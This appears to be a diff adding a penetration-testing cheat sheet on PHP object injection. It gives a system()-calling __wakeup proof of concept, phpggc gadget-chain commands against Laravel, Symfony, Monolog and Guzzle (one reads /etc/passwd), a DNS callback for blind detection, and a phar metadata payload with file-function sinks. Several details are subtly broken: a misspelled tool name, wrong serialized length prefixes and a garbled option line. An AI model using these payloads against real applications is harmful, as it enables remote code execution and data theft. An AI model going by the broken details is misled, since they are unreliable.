@@ -1,0 +1,104 @@
+# PHP Object Injection / Deserialization
+
+## 1. DETECTION — PHP serialized blob format
+```
+O:<n>:"<Class>":<count>:{...}     (object)
+a:<n>:{...}                       (array  - same leak)
+s:<len>:"...";                    (string)
+i:<int>;                          (int)
+```
+Typical in:
+```
+Cookie: session=O:8:"MyClass":2:{s:3:"foo";s:3:"bar";s:3:"cmd";s:2:"ls";}
+Cookie: data=O:8:"User":1:{s:3:"ref";s:8:"User1337";}
+param:   ?advance=O:19:"PHPExcel_Style_NumberFormat":...
+```
+Magic:
+- Starts with `O:`
+- Or base64 of the above (some apps base64_encode the cookie)
+
+## 2. TRIGGER (magic methods)
+If a class with an autoloaded gadget is deserialized, these run during/after:
+```
+__wakeup()    __destruct()    __sleep()    __toString()
+__call()      __get()         __set()      __isset()
+__unset()     __invoke()      __set_state()
+```
+PoC "wakeup that calls system":
+```php
+<?php
+class Evil { public $cmd; function __wakeup(){ system($this->cmd); } }
+echo serialize(new Evil());
+// O:4:"Evil":1:{s:3:"cmd";s:2:"ls";}
+?>
+```
+Then send `O:4:"Evil":1:{s:3:"cmd";s:4:"id";}` into any endpoint that unserializes.
+
+## 3. PHPGGC — ready gadget chains
+```bash
+# list
+php phpgcc.php -l
+# laravel / symfony / monolog / guzzle / ...
+php phpgcc.php -i laravel         # info for a gadget
+php phpgcc.php Laravel/RCE1 system whoami
+php phpgcc.php Symfony/RCE4 system 'id'
+php phpgcc.php Monolog/RCE1 system 'id'
+php phpgcc.php Guzzle/RCE1 system 'cat /etc/passwd'
+php phpgcc.php -s  (fastbin json?)
+```
+Output is the serialized string → drop into cookie/param/body.
+
+PHPGGC chains to enumerate for a real app:
+```
+Laravel/RCE1..10
+Symfony/RCE1..9
+Monolog/RCE1..10
+Guzzle/RCE1..5
+Laminas/RCE1..x
+ThinkPHP/RCE1..x
+Drupal/RCE1..4
+CakePHP/RCE1..x
+```
+(Because autoloaders can trigger gadgets without you knowing exact class.)
+
+## 4. BLIND DETECTION (DNS / sleep)
+```
+# chain that calls system("nslookup COLLAB.oastify.com")
+# or a __destruct that pings; watch DNS
+```
+Common blind markers:
+- 500 error for valid gadget vs 200 for garbage → oracle
+- Response time difference (sleep)
+
+## 5. PHAR DESERIALIZATION (file upload to RCE via phar://)
+PHP `phar://` wrapper deserializes metadata even with `unserialize()` untouched in some parsers.
+```php
+<?php
+// evil.php
+$phar = new Phar('x.phar');
+$phar->startBuffering();
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+$o = new Evil();
+$o->cmd = "id";
+$phar->setMetadata($o);
+$phar->stopBuffering();
+```
+Include the phar:
+```
+file_exists("phar://uploads/x.phar")
+include("phar://upload/x.phar")
+getimagesize("phar://x.phar")
+```
+Known sink functions (list non-exhaustive):
+`file_exists, file_get_contents, is_file, is_dir, fopen, unlink, stat, getimagesize, filesize`
+
+## 6. MINIMAL POP in-app check (authorized lab)
+If the app has a class like `Logger` with `__destruct` calling an arbitrary method, trigger:
+```
+O:12:"MyLoggerApp":"..."
+```
+Refer to framework docs not needed — use PHPGGC first for the big frameworks.
+
+## 7. Reporting
+- Serialization in a cookie/param + any `__destruct`/`__wakeup` sink = RCE.
+- Show `O:...` blob + the resulting reverse shell or id output.
